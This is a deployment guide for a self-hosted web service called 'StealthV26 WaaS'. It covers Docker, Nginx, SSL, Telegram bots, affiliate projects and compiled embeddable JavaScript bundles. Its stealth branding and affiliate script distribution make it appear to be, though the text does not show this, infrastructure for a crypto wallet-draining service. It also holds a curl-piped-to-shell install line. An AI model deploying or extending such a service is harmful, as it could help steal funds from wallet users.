# StealthV26 WaaS — Deployment Guide

Self-hosted VPS deployment using Docker Compose + Nginx.  
Stack: **Next.js 16 · Redis 7 · Kafka · Nginx · Let's Encrypt**

---

## Prerequisites

| Requirement | Minimum |
|---|---|
| VPS RAM | 2 GB (4 GB recommended) |
| VPS CPU | 2 vCPU |
| VPS Disk | 20 GB SSD |
| OS | Ubuntu 22.04 LTS |
| Open ports | 80, 443 |
| Domain | A record → server IP |

---

## Step 1 — Server setup

```bash
# Update system
apt update && apt upgrade -y

# Install Docker + Compose
curl -fsSL https://get.docker.com | sh
apt install -y nginx certbot python3-certbot-nginx git

# Verify
docker --version
docker compose version
nginx -v
```

---

## Step 2 — Clone & configure

```bash
# Clone the repo
git clone <your-repo-url> /opt/waas
cd /opt/waas

# Create your environment file from the template
cp .env.production.template .env.local
```

### Fill in `.env.local`

Open `.env.local` and fill in every `[REQUIRED]` value. Use the table below:

| Variable | Where to get it | Notes |
|---|---|---|
| `NEXT_PUBLIC_BASE_URL` | Your domain | e.g. `https://v26sequence.com` |
| `NEXT_PUBLIC_APP_URL` | Same as above | Used by AppKit metadata |
| `AUTH_SECRET` | `openssl rand -hex 32` | Session signing key |
| `ENCRYPTION_KEY` | `openssl rand -hex 32` | AES-256-GCM for stored secrets |
| `ADMIN_PANEL_PASSWORD` | Choose a strong password | Min 8 chars |
| `OWNER_ADDRESS` | Your wallet address | Full admin access |
| `NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID` | [cloud.reown.com](https://cloud.reown.com) | WalletConnect |
| `NEXT_PUBLIC_PROJECT_ID` | Same as above | Same key, different var name |
| `NEXT_PUBLIC_SEQUENCE_PROJECT_ACCESS_KEY` | [sequence.build](https://sequence.build) | WaaS SDK key |
| `NEXT_PUBLIC_SEQUENCE_WAAS_CONFIG_KEY` | sequence.build | WaaS embedded wallet key |
| `NEXT_PUBLIC_SEQUENCE_PROJECT_ID` | sequence.build | Numeric project ID |
| `TELEGRAM_BOT_TOKEN` | [@BotFather](https://t.me/BotFather) on Telegram | Platform OP bot |
| `TELEGRAM_CHAT_ID` | Send `/start` to [@userinfobot](https://t.me/userinfobot) | Your personal chat ID |
| `TELEGRAM_ADMIN_CHAT_IDS` | Same as `TELEGRAM_CHAT_ID` | Comma-separated, controls who can use admin bot commands |
| `TELEGRAM_WEBHOOK_SECRET` | `openssl rand -hex 16` | Protects the webhook endpoint |
| `RELAYER_PRIVATE_KEY` | `cast wallet new` (Foundry) | Dedicated hot wallet, low balance |
| `REDIS_URL` | Railway dashboard → Redis service → **Variables** tab | e.g. `redis://default:pass@host.railway.app:6379` |

> **Contract addresses** are already filled in the template — they match the deployed contracts in `.env.local`.

---

## Step 3 — SSL certificate (before starting Docker)

```bash
# Install SSL cert (nginx must NOT be running yet, or use --standalone)
certbot certonly --standalone -d v26sequence.com

# Or if nginx is running:
certbot --nginx -d v26sequence.com
```

---

## Step 4 — Nginx configuration

```bash
# Copy the config
cp /opt/waas/nginx.conf /etc/nginx/sites-available/waas

# Edit: replace every "v26sequence.com" with your actual domain
nano /etc/nginx/sites-available/waas

# Enable
ln -sf /etc/nginx/sites-available/waas /etc/nginx/sites-enabled/waas
rm -f /etc/nginx/sites-enabled/default

# Test + reload
nginx -t && systemctl reload nginx
```

---

## Step 5 — Launch with Docker Compose

```bash
cd /opt/waas

# Build and start all services (app + redis + kafka + indexer)
docker compose -f docker-compose.prod.yml up -d --build

# Watch logs
docker compose -f docker-compose.prod.yml logs -f app

# Verify health
curl https://v26sequence.com/api/health
```

Expected health response:
```json
{
  "status": "healthy",
  "checks": { "app": "ok", "redis": "ok", "kafka": "ok" }
}
```

---

## Step 6 — Register Telegram webhooks

### Platform OP bot (main admin bot)

```bash
cd /opt/waas

# Register the main webhook (reads TELEGRAM_BOT_TOKEN + NEXT_PUBLIC_BASE_URL from .env.local)
node scripts/register-telegram-webhook.mjs
```

This registers: `https://v26sequence.com/api/telegram/webhook`

Then trigger BotFather command registration (one-time):
```bash
curl https://v26sequence.com/api/telegram/webhook
```

### Per-affiliate bots

For each affiliate project, after setting their `telegramBotToken` in the admin panel, register their webhook by calling the Telegram API directly:

```bash
BOT_TOKEN="<affiliate-bot-token>"
YOUR_DOMAIN="https://v26sequence.com"

curl -X POST "https://api.telegram.org/bot${BOT_TOKEN}/setWebhook" \
  -H "Content-Type: application/json" \
  -d "{
    \"url\": \"${YOUR_DOMAIN}/api/telegram/affiliate/${BOT_TOKEN}\",
    \"allowed_updates\": [\"message\", \"callback_query\"],
    \"drop_pending_updates\": false
  }"
```

> The affiliate bot URL embeds the token — no shared secret needed for per-affiliate bots.

---

## Step 7 — Initial admin setup

1. Go to `https://v26sequence.com` → click **Login As Global Admin** → enter `ADMIN_PANEL_PASSWORD`
2. Go to **Settings** → verify contract addresses, set Telegram notification preferences
3. Go to **Affiliates** → create your first affiliate project
4. Go to **Compile** → compile and publish the first script bundle
5. Open your Telegram bot → send `/start` → verify the ops dashboard works

---

## Maintenance

### Update the app

```bash
cd /opt/waas
git pull
docker compose -f docker-compose.prod.yml up -d --build app
```

### View logs

```bash
# App logs
docker compose -f docker-compose.prod.yml logs -f app

# Redis logs
docker compose -f docker-compose.prod.yml logs -f redis

# All services
docker compose -f docker-compose.prod.yml logs -f
```

### Redis backup

Redis is managed by Railway — use the Railway dashboard to export snapshots or configure automated backups under your Redis service settings.

### Restart individual service

```bash
docker compose -f docker-compose.prod.yml restart app
```

### Stop everything

```bash
docker compose -f docker-compose.prod.yml down
# Add -v to also delete volumes (WARNING: deletes all data)
```

---

## End-to-end test checklist

Run through these after first deploy:

- [ ] `GET /api/health` returns `status: healthy`
- [ ] `GET /api/relay/status` shows relay configured (or `relayConfigured: false` if key not set — that's OK)
- [ ] Admin login works at `/` with `ADMIN_PANEL_PASSWORD`
- [ ] Create an affiliate project in `/affiliates`
- [ ] Compile a script — bundle appears in `/compile` and downloads correctly
- [ ] Embed script URL `https://v26sequence.com/api/script?configId=aff_xxx` returns JS
- [ ] Telegram OP bot: send `/ops` — ops dashboard appears with health + relay + stats
- [ ] Telegram OP bot: send `/health` — system health detail
- [ ] Telegram OP bot: send `/projects` — affiliate list appears
- [ ] Affiliate bot (if configured): send `/status` — project info appears
- [ ] `/api/telegram/webhook` GET returns `{ status: "ok", bot: { enabled: true } }`

---

## Troubleshooting

| Problem | Fix |
|---|---|
| `redis: down` in health | Check Redis container: `docker compose -f docker-compose.prod.yml ps` |
| App won't start | Check logs: `docker compose -f docker-compose.prod.yml logs app` |
| Telegram webhook 401 | `TELEGRAM_WEBHOOK_SECRET` mismatch — re-run `register-telegram-webhook.mjs` |
| `/api/script` returns 404 | Check `configId` is valid and project `status: active` |
| Build fails in Docker | Check `NEXT_PUBLIC_*` vars are set — they're baked at build time |
| SSL cert errors | Re-run `certbot renew` or check `nginx -t` |
| ioredis not connecting | Verify `REDIS_URL` format from Railway dashboard — use the **external** URL (not the internal Railway domain) when connecting from outside Railway |

---

## Environment variable quick reference

```bash
# Generate all secrets at once
echo "AUTH_SECRET=$(openssl rand -hex 32)"
echo "ENCRYPTION_KEY=$(openssl rand -hex 32)"
echo "TELEGRAM_WEBHOOK_SECRET=$(openssl rand -hex 16)"
```

Railway Redis URL — copy from Railway dashboard → Redis service → Variables tab:
```
REDIS_URL=redis://default:<password>@<host>.railway.app:<port>
```
> Use the **public/external** URL (not `railway.internal`) since the app runs on your VPS, not inside Railway's network.
